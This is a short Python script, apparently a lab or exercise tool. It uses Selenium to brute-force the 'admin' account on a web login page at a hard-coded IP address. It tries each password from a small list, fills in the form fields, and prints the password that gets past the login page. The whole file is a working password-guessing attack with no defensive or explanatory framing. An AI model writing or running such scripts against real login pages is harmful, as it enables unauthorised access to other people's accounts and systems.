from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import time

class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

user = "admin"
driver = webdriver.Chrome()

driver.get('http://141.87.56.56:5000/login')

title=""

passwords = ["sdfsdf", "dfsdf", "dfhjf","pass", "secure_af", "test", "admin"]

i = 0

for passw in passwords:
    print(f"{colors.OKBLUE}[INFO] Testing password '{passw}'.{colors.ENDC}")

    res = driver.find_elements(By.CLASS_NAME, "form-control")

    assert(len(res) == 2)

    res[0].clear()
    res[0].send_keys(user)
    res[1].clear()
    res[1].send_keys(passw)

    but = driver.find_elements(By.ID, "login-in-button")
    assert(len(but) == 1)
    but[0].click()
    time.sleep(2)

    print(f"{colors.OKBLUE}[INFO] New page title is '{driver.title}'.{colors.ENDC}")

    if driver.title != "Login":
        print(f"{colors.OKGREEN}[SUCCESS] The correct password for user '{user}' is '{passw}'.{colors.ENDC}")
        break



driver.quit()